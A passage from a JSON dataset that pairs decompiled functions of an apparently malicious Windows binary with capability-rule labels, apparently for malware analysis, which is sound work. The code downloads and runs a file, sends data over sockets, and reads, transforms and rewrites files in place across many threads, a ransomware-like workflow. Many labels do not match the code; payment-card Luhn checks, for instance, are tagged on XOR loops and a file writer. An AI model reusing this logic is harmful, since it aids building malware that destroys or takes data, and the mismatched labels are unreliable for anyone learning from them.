      uVar9 = fcn.0040a445(0x405578);\n                fcn.00407b0e(uVar9, uVar8);\n                uVar9 = fcn.00407b7e(auStack516, puVar6);\n                fcn.00407b0e(uVar9, arg_ch);\n                fcn.00405c90(1);\n                fcn.00405c90(1);\n                fcn.00405c90(1);\n                if (uStack536 < 0x10) {\n                    apppuStack556[0] = apppuStack556;\n                }\n                (*_sym.imp.WS2_32.dll_send)(uVar5, apppuStack556[0], uStack540);\n                fcn.00405c90(1);\n                fcn.00405c90(1);\n                fcn.00405c90(1);\n                goto code_r0x0040ac03;\n            }\n        }\n    }\n    fcn.00405c90(1);\n    fcn.00405c90(1);\ncode_r0x0040ac03:\n    fcn.0040b39f(arg_8h_00);\n    return;\n}\n",
        "token_count": 1153
    },
    "0040ac18": {
        "rules": [
            "parse credit card information/92c3fd9898ba41b4bad3ffb6188f4688",
            "search for credit card data/212a26c2b8d740cd9f6579dba482d653"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040ac18(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, int32_t arg_18h, uint32_t arg_1ch)\n\n{\n    bool bVar1;\n    code *pcVar2;\n    uint uVar3;\n    uint *puVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint *puVar7;\n    uint *puVar8;\n    uint arg_8h_00;\n    uint noname_3_00;\n    uint arg_18h_00;\n    uint arg_24h;\n    uint uVar9;\n    uint uVar10;\n    uint var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_58h;\n    uint var_3ch;\n    uint var_20h;\n    uint var_4h;\n    \n    uVar10 = 0x405590;\n    uVar3 = fcn.0040b1c7();\n    puVar4 = fcn.00408f15(uVar3, uVar10);\n    if (7 < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    (*_sym.imp.urlmon.dll_URLDownloadToFileW)(0, 0x4055a8, puVar4, 0, 0);\n    fcn.00407574(1);\n    fcn.00407574(1);\n    uVar10 = 0x405630;\n    uVar3 = fcn.0040b1c7();\n    puVar4 = fcn.00408f15(uVar3, uVar10);\n    if (7 < puVar4[5]) {\n        puVar4 = *puVar4;\n    }\n    iVar5 = (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(puVar4, 0);\n    if (iVar5 == 0) {\n        iVar5 = (*_sym.imp.KERNEL32.dll_GetLastError)();\n        if (iVar5 != 0xb7) {\n            bVar1 = false;\n            goto code_r0x0040acb4;\n        }\n    }\n    bVar1 = true;\ncode_r0x0040acb4:\n    fcn.00407574(1);\n    fcn.00407574(1);\n    if (bVar1) {\n        uVar10 = 0x405590;\n        uVar3 = fcn.0040b1c7();\n        puVar6 = fcn.00408f15(uVar3, uVar10);\n        pcVar2 = _sym.imp.OLEAUT32.dll_SysReAllocString;\n        if (7 < puVar6[5]) {\n            puVar6 = *puVar6;\n        }\n        uVar3 = (*_sym.imp.OLEAUT32.dll_SysReAllocString)(puVar6);\n        fcn.00407574(1);\n        fcn.00407574(1);\n        uVar9 = 0x405630;\n        uVar10 = fcn.0040b1c7();\n        puVar6 = fcn.00408f15(uVar10, uVar9);\n        if (7 < puVar6[5]) {\n            puVar6 = *puVar6;\n        }\n        uVar10 = (*pcVar2)(puVar6);\n        fcn.00407574(1);\n        fcn.00407574(1);\n        fcn.0040a7d9(uVar3, uVar10);\n        pcVar2 = _sym.imp.OLEAUT32.dll_SysStringLen;\n        (*_sym.imp.OLEAUT32.dll_SysStringLen)(uVar3);\n        (*pcVar2)();\n        uVar9 = 0x405590;\n        uVar3 = fcn.0040b1c7();\n        puVar6 = fcn.00408f15(uVar3, uVar9);\n        if (7 < puVar6[5]) {\n            puVar6 = *puVar6;\n        }\n        (*_sym.imp.KERNEL32.dll_DeleteFileW)();\n        arg_18h_00 = 1;\n        fcn.00407574(1);\n        noname_3_00 = 1;\n        fcn.00407574(1);\n        uVar9 = 0x405640;\n        uVar3 = fcn.0040b1c7();\n        puVar7 = fcn.00408f15(uVar3, uVar9);\n        if (7 < puVar7[5]) {\n            puVar7 = *puVar7;\n        }\n        uVar9 = 0;\n        uVar3 = 0;\n        (*_sym.imp.SHELL32.dll_ShellExecuteW)(0, 0x405668, puVar7, 0);\n        fcn.00407574(1);\n        fcn.00407574(1);\n        (*_sym.imp.KERNEL32.dll_Sleep)(30000);\n        puVar7 = arg_8h;\n        if (arg_1ch < 0x10) {\n            puVar7 = &fcn.0040ac18::arg_8h;\n        }\n        puVar7 = puVar7 + arg_18h;\n        puVar8 = arg_8h;\n        if (arg_1ch < 0x10) {\n            puVar8 = &fcn.0040ac18::arg_8h;\n        }\n        for (; puVar8 != puVar7; puVar8 = puVar8 + 1) {\n            if (*puVar8 == '+') {\n                *puVar8 = '.';\n            }\n        }\n        puVar7 = arg_8h;\n        if (arg_1ch < 0x10) {\n            puVar7 = &fcn.0040ac18::arg_8h;\n        }\n        puVar7 = puVar7 + arg_18h;\n        puVar8 = arg_8h;\n        if (arg_1ch < 0x10) {\n            puVar8 = &fcn.0040ac18::arg_8h;\n        }\n        for (; puVar8 != puVar7; puVar8 = puVar8 + 1) {\n            if (*puVar8 == '/') {\n                *puVar8 = '_';\n            }\n        }\n        puVar7 = arg_8h;\n        if (arg_1ch < 0x10) {\n            puVar7 = &fcn.0040ac18::arg_8h;\n        }\n        puVar7 = puVar7 + arg_18h;\n        puVar8 = arg_8h;\n        if (arg_1ch < 0x10) {\n            puVar8 = &fcn.0040ac18::arg_8h;\n        }\n        for (; puVar8 != puVar7; puVar8 = puVar8 + 1) {\n            if (*puVar8 == '=') {\n                *puVar8 = '-';\n            }\n        }\n        arg_24h = 0x40ae82;\n        fcn.004071e6(&fcn.0040ac18::arg_8h);\n        arg_8h_00 = 0x402028;\n        fcn.004071e6(0x402028);\n        fcn.0040a9be(arg_8h_00, uVar3, uVar9, noname_3_00, arg_18h_00, puVar6, uVar10, arg_24h);\n    }\n    fcn.00405c90(1);\n    fcn.0040b39f(puVar4);\n    return;\n}\n",
        "token_count": 1677
    },
    "00405ab1": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405ab1(uint8_t *param_1)\n\n{\n    uint32_t in_EAX;\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    puVar1 = (in_EAX & 0xff) * 0x10 + 0x414288;\n    iVar3 = 4;\n    do {\n        iVar2 = 4;\n        do {\n            *param_1 = *param_1 ^ *puVar1;\n            puVar1 = puVar1 + 1;\n            param_1 = param_1 + 1;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return;\n}\n",
        "token_count": 182
    },
    "00405ad3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405ad3(uint8_t *param_1)\n\n{\n    uint8_t *puVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    \n    iVar3 = 4;\n    do {\n        iVar2 = 4;\n        puVar1 = param_1;\n        do {\n            *puVar1 = *(*puVar1 + 0x403fb0);\n            puVar1 = puVar1 + 4;\n            iVar2 = iVar2 + -1;\n        } while (iVar2 != 0);\n        param_1 = param_1 + 1;\n        iVar3 = iVar3 + -1;\n    } while (iVar3 != 0);\n    return;\n}\n",
        "token_count": 159
    },
    "00405c51": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.00405c51(void)\n\n{\n    int32_t iVar1;\n    int32_t *unaff_EBX;\n    int32_t iVar2;\n    uint var_4h;\n    \n    iVar2 = *unaff_EBX;\n    if (iVar2 != 0) {\n        iVar1 = unaff_EBX[1];\n        for (; iVar2 != iVar1; iVar2 = iVar2 + 0x1c) {\n            fcn.00405c90(1);\n        }\n        fcn.0040b84b(*unaff_EBX);\n    }\n    *unaff_EBX = 0;\n    unaff_EBX[1] = 0;\n    unaff_EBX[2] = 0;\n    return;\n}\n",
        "token_count": 165
    },
    "004064cb": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.004064cb(void)\n\n{\n    uint uVar1;\n    uint *noname_2;\n    uint *noname_4;\n    uint *arg_20h;\n    uint *arg_8h;\n    uint *arg_8h_00;\n    uint arg_ch;\n    uint *arg_8h_01;\n    uint arg_ch_00;\n    uint *arg_8h_02;\n    uint arg_ch_01;\n    uint *puVar2;\n    uint arg_ch_02;\n    uint *arg_8h_03;\n    uint arg_ch_03;\n    uint *puVar3;\n    uint arg_ch_04;\n    uint *puVar4;\n    uint arg_ch_05;\n    uint in_stack_fffffa3c;\n    uint uVar5;\n    uint uVar6;\n    uint uVar7;\n    uint in_stack_fffffa5c;\n    uint in_stack_fffffa60;\n    uint in_stack_fffffa64;\n    uint in_stack_fffffa68;\n    uint in_stack_fffffa6c;\n    uint var_578h;\n    uint var_574h;\n    uint var_570h;\n    uint var_56ch;\n    uint var_568h;\n    uint var_564h;\n    uint var_560h;\n    uint var_55ch;\n    uint var_558h;\n    uint var_554h;\n    uint var_550h;\n    uint var_54ch;\n    uint var_548h;\n    uint var_544h;\n    uint var_528h;\n    uint var_50ch;\n    uint var_4f0h;\n    uint var_4d4h;\n    uint var_4b8h;\n    uint var_49ch;\n    uint var_480h;\n    uint var_464h;\n    uint var_448h;\n    uint var_42ch;\n    uint var_410h;\n    uint var_3f4h;\n    uint var_3d8h;\n    uint var_3bch;\n    uint var_3a0h;\n    uint var_384h;\n    uint var_368h;\n    uint var_34ch;\n    uint var_330h;\n    uint var_314h;\n    uint var_2f8h;\n    uint var_2dch;\n    uint var_2c0h;\n    uint var_2a4h;\n    uint var_288h;\n    uint var_26ch;\n    uint var_250h;\n    uint var_234h;\n    uint var_218h;\n    uint var_1fch;\n    uint var_1e0h;\n    uint var_1c4h;\n    uint var_1a8h;\n    uint var_18ch;\n    uint var_170h;\n    uint var_154h;\n    uint var_138h;\n    uint var_11ch;\n    uint var_100h;\n    uint var_e4h;\n    uint var_c8h;\n    uint var_ach;\n    uint var_90h;\n    uint var_74h;\n    uint var_58h;\n    uint var_3ch;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    uVar7 = 0x4043c0;\n    fcn.0040720a(0x4043c0);\n    puVar2 = &fcn.004064cb::var_20h;\n    fcn.0040aeb4(puVar2, uVar7, in_stack_fffffa5c, in_stack_fffffa60, in_stack_fffffa64, in_stack_fffffa68, \n                 in_stack_fffffa6c);\n    fcn.004073be();\n    fcn.00405c90(1);\n    uVar1 = fcn.0040b1c7();\n    fcn.0040b08b(uVar1);\n    uVar1 = 0x404418;\n    fcn.0040720a(0x404418);\n    puVar4 = &fcn.004064cb::var_50ch;\n    fcn.0040aeb4(puVar4, uVar1, puVar2, uVar7, in_stack_fffffa5c, in_stack_fffffa60, in_stack_fffffa64);\n    uVar6 = 0x404448;\n    fcn.0040720a(0x404448);\n    puVar3 = &fcn.004064cb::var_4d4h;\n    uVar5 = 0x406576;\n    fcn.0040aeb4(puVar3, uVar6, puVar4, uVar1, puVar2, uVar7, in_stack_fffffa5c);\n    uVar1 = 0x4044c4;\n    fcn.0040720a(0x4044c4);\n    puVar2 = &fcn.004064cb::var_49ch;\n    fcn.0040aeb4(puVar2, uVar1, in_stack_fffffa3c, uVar5, puVar3, uVar6, puVar4);\n    uVar6 = 0x4044f0;\n    fcn.0040720a(0x4044f0);\n    puVar4 = &fcn.004064cb::var_464h;\n    fcn.0040aeb4(puVar4, uVar6, puVar2, uVar1, in_stack_fffffa3c, uVar5, puVar3);\n    uVar5 = 0x40455c;\n    fcn.0040720a(0x40455c);\n    puVar3 = &fcn.004064cb::var_42ch;\n    fcn.0040aeb4(puVar3, uVar5, puVar4, uVar6, puVar2, uVar1, in_stack_fffffa3c);\n    uVar1 = 0x404598;\n    fcn.0040720a(0x404598);\n    arg_8h_03 = &fcn.004064cb::var_3f4h;\n    fcn.0040aeb4(arg_8h_03, uVar1, puVar3, uVar5, puVar4, uVar6, puVar2);\n    uVar6 = 0x4045e8;\n    fcn.0040720a(0x4045e8);\n    puVar2 = &fcn.004064cb::var_3bch;\n    fcn.0040aeb4(puVar2, uVar6, arg_8h_03, uVar1, puVar3, uVar5, puVar4);\n    arg_ch_05 = 0x4044e8;\n    uVar5 = 0x4046b0;\n    fcn.0040720a(0x4046b0);\n    arg_8h_02 = &fcn.004064cb::var_384h;\n    fcn.0040aeb4(arg_8h_02, uVar5, puVar2, uVar6, arg_8h_03, uVar1, puVar3);\n    arg_ch_04 = 0x4044e8;\n    uVar1 = 0x4046d8;\n    fcn.0040720a(0x4046d8);\n    arg_8h_01 = &fcn.004064cb::var_34ch;\n    fcn.0040aeb4(arg_8h_01, uVar1, arg_8h_02, uVar5, puVar2, uVar6, arg_8h_03);\n    arg_ch_03 = 0x4044e8;\n    uVar6 = 0x404748;\n    fcn.0040720a(0x404748);\n    arg_8h_00 = &fcn.004064cb::var_314h;\n    fcn.0040aeb4(arg_8h_00, uVar6, arg_8h_01, uVar1, arg_8h_02, uVar5, puVar2);\n    arg_ch_02 = 0x404440;\n    uVar5 = 0x4047d0;\n    fcn.0040720a(0x4047d0);\n    arg_8h = &fcn.004064cb::var_2dch;\n    fcn.0040aeb4(arg_8h, uVar5, arg_8h_00, uVar6, arg_8h_01, uVar1, arg_8h_02);\n    arg_ch_01 = 0x404440;\n    uVar1 = 0x4047f8;\n    fcn.0040720a(0x4047f8);\n    arg_20h = &fcn.004064cb::var_2a4h;\n    fcn.0040aeb4(arg_20h, uVar1, arg_8h, uVar5, arg_8h_00, uVar6, arg_8h_01);\n    arg_ch_00 = 0x4044e8;\n    uVar6 = 0x4048b0;\n    fcn.0040720a(0x4048b0);\n    noname_4 = &fcn.004064cb::var_26ch;\n    fcn.0040aeb4(noname_4, uVar6, arg_20h, uVar1, arg_8h, uVar5, arg_8h_00);\n    arg_ch = 0x404440;\n    uVar5 = 0x404950;\n    fcn.0040720a(0x404950);\n    noname_2 = &fcn.004064cb::var_234h;\n    fcn.0040aeb4(noname_2, uVar5, noname_4, uVar6, arg_20h, uVar1, arg_8h);\n    uVar7 = 0x404440;\n    uVar1 = 0x404970;\n    fcn.0040720a(0x404970);\n    uVar1 = fcn.0040aeb4(&fcn.004064cb::var_1fch, uVar1, noname_2, uVar5, noname_4, uVar6, arg_20h);\n    fcn.00407b0e(uVar1, arg_8h);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, uVar7);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, arg_8h_00);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, arg_ch);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, arg_8h_01);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, arg_ch_00);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, arg_8h_02);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, arg_ch_01);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, puVar2);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, arg_ch_02);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, arg_8h_03);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, arg_ch_03);\n    fcn.00407b3a();\n    uVar1 = fcn.00407b7e(&fcn.004064cb::var_138h, puVar3);\n    uVar1 = fcn.00407b0e(uVar1, arg_ch_04);\n    fcn.00407b0e(uVar1, puVar4);\n    uVar1 = fcn.00407b3a();\n    fcn.00407b0e(uVar1, arg_ch_05);\n    fcn.00407b3a();\n    fcn.00407b3a();\n    fcn.004073be();\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    uVar1 = 1;\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00407574(1);\n    fcn.0040b39f(uVar1);\n    return;\n}\n",
        "token_count": 3371
    },
    "00406ba0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406ba0(uint arg_8h)\n\n{\n    uchar *puVar1;\n    uint *puVar2;\n    uchar *puVar3;\n    int32_t iVar4;\n    uint arg_8h_00;\n    uint lpNumberOfBytesWritten;\n    int32_t var_28h;\n    int32_t lpBuffer;\n    uint var_20h;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    lpBuffer = fcn.0040b394(*0x402054);\n    puVar3 = *0x402044;\n    if (*0x402058 < 0x10) {\n        puVar3 = 0x402044;\n    }\n    puVar3 = puVar3 + *0x402054;\n    puVar1 = *0x402044;\n    if (*0x402058 < 0x10) {\n        puVar1 = 0x402044;\n    }\n    if (puVar1 != puVar3) {\n        iVar4 = lpBuffer - puVar1;\n        do {\n            puVar1[iVar4] = *puVar1;\n            puVar1 = puVar1 + 1;\n        } while (puVar1 != puVar3);\n    }\n    puVar2 = fcn.00407ab8(0x404998);\n    if (7 < puVar2[5]) {\n        puVar2 = *puVar2;\n    }\n    arg_8h_00 = 0xc0000000;\n    var_28h = (*_sym.imp.KERNEL32.dll_CreateFileW)(puVar2, 0xc0000000, 0, 0, 2, 0x80, 0);\n    fcn.00407574(1);\n    iVar4 = var_28h;\n    if (var_28h != 0) {\n        (*_sym.imp.KERNEL32.dll_SetFilePointer)(var_28h, 0, 0, 0);\n        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar4, lpBuffer, *0x402054, &lpNumberOfBytesWritten, 0);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar4);\n    }\n    fcn.0040d306(lpBuffer);\n    fcn.00407574(1);\n    fcn.0040b39f(arg_8h_00);\n    return;\n}\n",
        "token_count": 538
    },
    "00406cf7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382",
            "contain loop",
            "write file on Windows",
            "get file size",
            "read file on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00406cf7(uint *arg_8h, uint noname_1, uint noname_2, uint noname_3, uint noname_4, uint32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    uint32_t uVar6;\n    int32_t iVar7;\n    code *pcVar8;\n    bool bVar9;\n    int64_t iVar10;\n    uint in_stack_ffffff18;\n    uint uVar11;\n    uint noname_4_00;\n    uint32_t arg_1ch_00;\n    uint in_stack_ffffff54;\n    uint in_stack_ffffff58;\n    uint in_stack_ffffff5c;\n    uint in_stack_ffffff60;\n    uint in_stack_ffffff64;\n    uint var_80h;\n    uint lpNumberOfBytesWritten;\n    int32_t var_78h;\n    uint nNumberOfBytesToWrite;\n    int32_t var_70h;\n    uint32_t nNumberOfBytesToRead;\n    int32_t var_68h;\n    uint lpBuffer;\n    uchar var_5dh;\n    uint *var_5ch;\n    int32_t var_4ch;\n    uint32_t var_48h;\n    uint *var_40h;\n    int32_t var_30h;\n    uint32_t var_2ch;\n    uint *var_24h;\n    int32_t var_14h;\n    uint32_t var_10h;\n    uint32_t var_8h;\n    \n    var_8h = *0x401304 ^ &stack0xfffffffc;\n    puVar3 = &var_5ch;\n    fcn.0040b0fe(0x10);\n    fcn.004071e6(puVar3);\n    fcn.004092b1(&var_24h, puVar3, in_stack_ffffff54, in_stack_ffffff58, in_stack_ffffff5c, in_stack_ffffff60, \n                 in_stack_ffffff64);\n    var_5dh = 10;\n    puVar3 = var_24h;\n    if (var_10h < 0x10) {\n        puVar3 = &var_24h;\n    }\n    puVar2 = var_24h;\n    if (var_10h < 0x10) {\n        puVar2 = &var_24h;\n    }\n    fcn.00407ba2(&var_70h, puVar2, puVar3 + var_14h);\n    puVar3 = var_24h;\n    if (var_10h < 0x10) {\n        puVar3 = &var_24h;\n    }\n    fcn.004072b8(var_70h, puVar3 + var_14h);\n    var_5dh = 0xd;\n    puVar3 = var_24h;\n    if (var_10h < 0x10) {\n        puVar3 = &var_24h;\n    }\n    puVar2 = var_24h;\n    if (var_10h < 0x10) {\n        puVar2 = &var_24h;\n    }\n    fcn.00407ba2(&var_70h, puVar2, puVar3 + var_14h);\n    if (var_10h < 0x10) {\n        var_24h = &var_24h;\n    }\n    fcn.004072b8(var_70h, var_24h + var_14h);\n    var_78h = fcn.0040b394(var_4ch);\n    iVar1 = fcn.0040b394(var_14h + *0x401fac);\n    var_2ch = 0xf;\n    var_30h = 0;\n    var_40h = var_40h & 0xffffff00;\n    fcn.00407c07();\n    fcn.00407c89(&var_24h, 0);\n    fcn.00407c89(0x401f9c, 0);\n    puVar3 = var_5ch;\n    if (var_48h < 0x10) {\n        puVar3 = &var_5ch;\n    }\n    if (var_48h < 0x10) {\n        var_5ch = &var_5ch;\n    }\n    if (var_5ch != puVar3 + var_4ch) {\n        iVar7 = var_78h - var_5ch;\n        do {\n            *(var_5ch + iVar7) = *var_5ch;\n            var_5ch = var_5ch + 1;\n        } while (var_5ch != puVar3 + var_4ch);\n    }\n    puVar3 = var_40h;\n    if (var_2ch < 0x10) {\n        puVar3 = &var_40h;\n    }\n    puVar3 = puVar3 + var_30h;\n    puVar2 = var_40h;\n    if (var_2ch < 0x10) {\n        puVar2 = &var_40h;\n    }\n    if (puVar2 != puVar3) {\n        iVar7 = iVar1 - puVar2;\n        do {\n            *(puVar2 + iVar7) = *puVar2;\n            puVar2 = puVar2 + 1;\n        } while (puVar2 != puVar3);\n    }\n    puVar3 = arg_8h;\n    if (arg_1ch < 8) {\n        puVar3 = &arg_8h;\n    }\n    uVar4 = (*_sym.imp.KERNEL32.dll_CreateFileW)(puVar3, 0xc0000000, 0, 0, 3, 0x80, 0);\n    if (uVar4 != 0) {\n        arg_1ch_00 = uVar4;\n        (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(uVar4, &nNumberOfBytesToRead);\n        if ((var_68h < 0) || ((var_68h < 1 && (nNumberOfBytesToRead < 0x61a801)))) {\n            var_70h = 0;\n            while( true ) {\n                noname_4_00 = 0;\n                uVar11 = 0x10;\n                iVar7 = var_68h;\n                arg_1ch_00 = nNumberOfBytesToRead;\n                iVar10 = fcn.00411c90();\n                if (iVar10 == 0) break;\n                bVar9 = nNumberOfBytesToRead != 0;\n                nNumberOfBytesToRead = nNumberOfBytesToRead - 1;\n                var_68h = var_68h + -1 + bVar9;\n                var_70h = var_70h + 1;\n            }\n            lpBuffer = fcn.0040b394(nNumberOfBytesToRead);\n            pcVar8 = _sym.imp.KERNEL32.dll_SetFilePointer;\n            (*_sym.imp.KERNEL32.dll_SetFilePointer)(uVar4, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_ReadFile)(uVar4, lpBuffer, nNumberOfBytesToRead, &nNumberOfBytesToWrite, 0);\n            fcn.00405bcc();\n            (*pcVar8)(uVar4, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WriteFile)(uVar4, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n            uVar6 = nNumberOfBytesToRead + var_70h;\n        }\n        else {\n            lpBuffer = fcn.0040b394(3200000);\n            noname_4_00 = 0;\n            uVar11 = 0;\n            iVar7 = 0;\n            in_stack_ffffff18 = 2;\n            iVar5 = fcn.00411d50(nNumberOfBytesToRead, var_68h);\n            pcVar8 = _sym.imp.KERNEL32.dll_SetFilePointer;\n            (*_sym.imp.KERNEL32.dll_SetFilePointer)(uVar4, iVar5 + -1600000);\n            (*_sym.imp.KERNEL32.dll_ReadFile)(uVar4, lpBuffer, 3200000, &nNumberOfBytesToWrite, 0);\n            fcn.00405bcc();\n            iVar5 = fcn.00411d50(nNumberOfBytesToRead, var_68h, 2, 0, 0, 0);\n            (*pcVar8)(uVar4, iVar5 + -1600000);\n            (*_sym.imp.KERNEL32.dll_WriteFile)(uVar4, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n            (*pcVar8)(uVar4, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_ReadFile)(uVar4, lpBuffer, 0x19000, &nNumberOfBytesToWrite, 0);\n            fcn.00405bcc();\n            (*pcVar8)(uVar4, 0, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WriteFile)(uVar4, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n            (*pcVar8)(uVar4, nNumberOfBytesToRead - 0x19000, 0, 0);\n            (*_sym.imp.KERNEL32.dll_ReadFile)(uVar4, lpBuffer, 0x19000, &nNumberOfBytesToWrite, 0);\n            fcn.00405bcc();\n            (*pcVar8)(uVar4, nNumberOfBytesToRead - 0x19000, 0, 0);\n            (*_sym.imp.KERNEL32.dll_WriteFile)(uVar4, lpBuffer, nNumberOfBytesToWrite, &lpNumberOfBytesWritten, 0);\n            uVar6 = nNumberOfBytesToRead;\n        }\n        (*pcVar8)(uVar4, uVar6, 0, 0);\n        (*_sym.imp.KERNEL32.dll_WriteFile)(uVar4, iVar1, var_14h + *0x401fac, &lpNumberOfBytesWritten, 0);\n        fcn.0040d306(lpBuffer);\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(uVar4);\n        puVar3 = &arg_8h;\n        fcn.0040736a(puVar3);\n        fcn.00406c90(puVar3, in_stack_ffffff18, iVar7, uVar11, noname_4_00, arg_1ch_00);\n    }\n    fcn.0040d306(var_78h);\n    fcn.0040d306(iVar1);\n    uVar11 = 1;\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00405c90(1);\n    fcn.00407574(1);\n    fcn.0040b39f(uVar11);\n    return;\n}\n",
        "token_count": 2454
    },
    "004070f0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004070f0(uint *arg_8h)\n\n{\n    if (7 < arg_8h[5]) {\n        arg_8h = *arg_8h;\n    }\n    fcn.00407390(arg_8h);\n    fcn.00405cfb(arg_8h);\n    return 0;\n}\n",
        "token_count": 77
    },
    "0040711b": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid fcn.0040711b(void)\n\n{\n    uint *puVar1;\n    uint uVar2;\n    uint32_t uVar3;\n    uint lpHandles;\n    int32_t var_24h;\n    uint *var_20h;\n    uint32_t var_ch;\n    uint32_t var_4h;\n    \n    var_4h = *0x401304 ^ &stack0xfffffffc;\n    uVar3 = 0;\n    if ((*0x41439c - *0x414398) / 0x1c != 0) {\n        var_24h = 0;\n        do {\n            fcn.0040b016(&var_20h);\n            puVar1 = var_20h;\n            if (var_ch < 8) {\n                puVar1 = &var_20h;\n            }\n            uVar2 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, fcn.004070f0, puVar1, 0, 0);\n            (&lpHandles)[uVar3] = uVar2;\n            (*_sym.imp.KERNEL32.dll_Sleep)(200);\n            fcn.00407574(1);\n            var_24h = var_24h + 0x1c;\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < (*0x41439c - *0x414398) / 0x1c);\n    }\n    uVar2 = 0xffffffff;\n    (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)((*0x41439c - *0x414398) / 0x1c, &lpHandles, 1);\n    fcn.0040b39f(uVar2);\n    return;\n}\n",
        "token_count": 387
    },
    "0040724e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
